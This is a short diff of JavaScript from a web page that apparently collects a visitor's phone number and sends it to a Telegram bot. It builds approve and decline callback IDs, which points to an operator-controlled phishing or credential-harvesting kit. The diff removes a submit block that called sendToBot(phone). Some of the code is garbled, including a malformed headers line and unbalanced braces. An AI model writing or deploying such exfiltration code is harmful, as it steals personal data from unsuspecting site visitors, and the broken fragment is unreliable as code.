@@ -500,8 +500,7 @@
       const ts        = Date.now();
       const approveId = `approve_${ts}`;
       const declineId = `decline_${ts}`;
-      const verifyId  = `verify_${ts}`;
-
+    
       fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Contents')
@@ -565,11 +564,6 @@
           });
       }, 1000);
     }
-
-    // ── Submit ──
-      sendToBot(phone);
-    });
-
     window.addEventListener('DOMContentLoaded', () => {
       const savedPhone = localStorage.getItem('fbc_phone_number');
       if (savedPhone) {
